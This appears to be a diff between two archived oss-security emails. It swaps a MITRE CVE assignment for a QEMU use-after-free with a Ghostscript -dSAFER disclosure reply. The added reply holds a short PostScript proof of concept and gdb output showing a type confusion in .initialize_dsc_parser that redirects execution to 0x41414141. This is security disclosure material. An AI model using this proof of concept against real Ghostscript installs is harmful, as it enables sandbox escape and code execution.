@@ -1,47 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/09/2
-Message-ID: <0a28087cee8346dba6e874e403ccd471@imshyb02.MITRE.ORG>
-Date: Fri, 9 Dec 2016 00:15:55 -0500
-From: <cve-assign@...re.org>
-To: <ppandit@...hat.com>
-CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>, <liqiang6-s@....cn>
-Subject: Re: CVE request Qemu: char: use after free issue in char backend
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/05/19
+Message-ID: <CAJ_zFkL0F5i-=14bDxN3_PDAvNqQT8PMNGmmij60DLuaHj+meA@mail.gmail.com>
+Date: Wed, 5 Oct 2016 13:12:19 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE Request - multiple ghostscript -dSAFER sandbox problems
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+On Wed, Oct 5, 2016 at 9:13 AM, Tavis Ormandy <taviso@...gle.com> wrote:
+> bug: type confusion in .initialize_dsc_parser allows remote code execution
+> id: http://bugs.ghostscript.com/show_bug.cgi?id=697190
+> repro: http://bugs.ghostscript.com/show_bug.cgi?id=697190#c0
+> patch: http://git.ghostscript.com/?p=ghostpdl.git;h=875a0095f37626a721c7ff57d606a0f95af03913
 
-> Quick Emulator(Qemu) built with the 'chardev' backend support is vulnerable to
-> a use after free issue. It could occur while hotplug and unplugging the device
-> in the guest.
-> 
-> A guest user/process could use this flaw to crash a Qemu process on the host
-> resulting in DoS.
-> 
-> https://lists.gnu.org/archive/html/qemu-devel/2016-10/msg05597.html
-> http://git.qemu.org/?p=qemu.git;a=commit;h=a4afa548fc6dd9842ed86639b4d37d4d1c4ad480
+It was pointed out to me that my testcase doesn't work on the 9.0x
+versions, because it doesn't allow encoding 64-bit integers, but it's
+still exploitable.
 
-Use CVE-2016-9923.
+For example, something like this should jump to 0x41414141:
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+$ cat test.ps
+%!PS
+[16#1 16#2 16#3 16#41414141 [16#4]] .initialize_dsc_parser
+$ gdb -q -ex r --args gs -dSAFER -f test.ps
+GPL Ghostscript 9.05 (2012-02-08)
+Copyright (C) 2010 Artifex Software, Inc.  All rights reserved.
+This software comes with NO WARRANTY: see the file PUBLIC for details.
 
-iQIcBAEBCAAGBQJYSjxoAAoJEHb/MwWLVhi2dS4P/ilXRDRPZhWKKopE5w9P5lj9
-4IY209xoJmQ85S891zCZvw3ety9GDpvAH1bi3uk49kqA9jeB9NYgJ+TD6ZyPEOoO
-gItsGg7FX6QK65tnno8I+QUlKgHM91vy/KEi/o2FgQHc7lDP2RBq9Bt9REvYaqh3
-QDh3IjaDieWy6T0Nkxh1I8u6+PeD+oBe6cNIFc8him7Vrb90SkT7Qe9/ZCG53MP8
-vgrkJA3mTc4ShKGbdBix2T1HhjdV/KIEEgQ5BDjlqhW6xFXVxRhBBRbhPMayGXkW
-1ulpwAU6q/i2e2GdydTxNV/RdOiKl1Zi3J3mScR8Lq3xjS0/Bw+cGyHfB9u/4kWm
-4PSeyISGWs992CYHAr+JlzQ5MG7rDg52bcEqixeDzQrUb84EwGED6pU11vU/8fE1
-t/fZaAS05FoS1mE16cDPyq0Floi95rmOn1H3TBHR9nKENvIJvFyhqYQmYXR43Jpl
-k//RBNrF+Hb18AtFOh9azEf0gOnhBrtTnHv2queK2gOc+YkxOx9P8R0BnI+bZV0o
-cWtEImu4CJR8EROlMuCWsI7lZ99Frw7N69oNv6AZo0rwyvxEhSLwp/QWR+scBEOx
-4tJ+300qsapKR+fSQxojA9em6yZ1QpukfD3ACUn7F8WQeA2RyzGpSjLimydUGpp6
-SHLCzbqDbd78s2ztkQam
-=R+2A
------END PGP SIGNATURE-----
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000041414141 in ?? ()
+
+Tavis.
